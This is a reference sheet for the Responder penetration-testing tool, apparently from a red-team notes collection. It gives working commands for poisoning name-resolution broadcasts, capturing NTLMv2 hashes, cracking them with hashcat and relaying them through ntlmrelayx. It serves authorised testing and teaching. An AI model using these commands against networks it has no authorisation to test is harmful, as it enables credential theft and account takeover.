# Responder - Full Reference

Responder poisons LLMNR, NBT-NS, and MDNS broadcasts to capture NTLMv2 hashes from machines that make name resolution requests on the network.

**Config file:** `/etc/responder/Responder.conf`

---

## Analyze Mode (Passive - No Poisoning)

Analyze mode listens for LLMNR/NBT-NS/MDNS traffic on the network **without responding to it**. You see what requests are being broadcast but you never spoof anything. This is passive reconnaissance, not poisoning.

```sh
# Analyze mode - passive only, no poisoning
sudo responder -I eth0 -A

# Verbose analyze mode
sudo responder -I eth0 -A -v
```

What you see in analyze mode:
- Which machines are making LLMNR/NBT-NS requests
- What hostnames they're trying to resolve
- Confirms LLMNR is enabled on the network (useful for the report)
- You do NOT capture hashes in analyze mode - machines don't send auth because you never respond

---

## Basic Usage

```sh
# Standard run - capture hashes
sudo responder -I eth0 -dPv

# Identify your interface first if unsure
ip a
```

**Every flag:**

| Flag | What it does | Use when |
|---|---|---|
| `-I eth0` | Network interface to listen on | Always required - match to your active interface |
| `-d` | Enable DHCP poisoning | Default - leave on |
| `-P` | Force NTLM auth on proxy requests | Leave on - captures more hashes |
| `-v` | Verbose output | Always - shows captures as they happen |
| `-w` | Start WPAD rogue proxy server | Add this if you want to capture browser proxy auth |
| `-F` | Force NTLM auth for WPAD | Pair with `-w` |
| `-b` | Return HTTP 401 (force basic auth) | Only use if you want cleartext instead of hash |

---

## For SMB Relay (Disable SMB + HTTP First)

When relaying instead of capturing, turn off SMB and HTTP so hashes go to ntlmrelayx instead of Responder:

```sh
sudo nano /etc/responder/Responder.conf
# Set:
# SMB = Off
# HTTP = Off

sudo responder -I eth0 -dPv
```

---

## Where Captured Hashes Go

```sh
# All captured hashes saved here automatically
ls /usr/share/responder/logs/

# Files named by protocol and hash type:
# SMB-NTLMv2-SSP-<ip>.txt
# HTTP-NTLMv2-<ip>.txt

# View all captured
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

**Hash format (NTLMv2):**
```
username::DOMAIN:challenge:response:blob
jdoe::CORP:1122334455667788:AABBCC...:0101...
```
-> Feed this entire line to hashcat `-m 5600`

---

## Cracking Captured Hashes

```sh
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.0.10.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

---

## When to Run Responder

- **Morning** - users logging in = most LLMNR traffic
- **After lunch** - same reason
- Any time users are accessing file shares
- Run for at least 30 min before giving up - it's passive, just wait

---

## After Capturing

Once you have a hash, two paths:

| Path | When |
|---|---|
| **Crack it** -> get plaintext password | Password is weak / in rockyou |
| **Relay it** -> [SMB Relay](../active-directory/initial-access/smb-relay.md) | Can't crack it, SMB signing off on targets |

---

## Multi-Relay (Run Both at Once)

You can run Responder + ntlmrelayx simultaneously - Responder captures, ntlmrelayx relays:

```sh
# Terminal 1 - Responder (SMB+HTTP off)
sudo responder -I eth0 -dPv

# Terminal 2 - ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
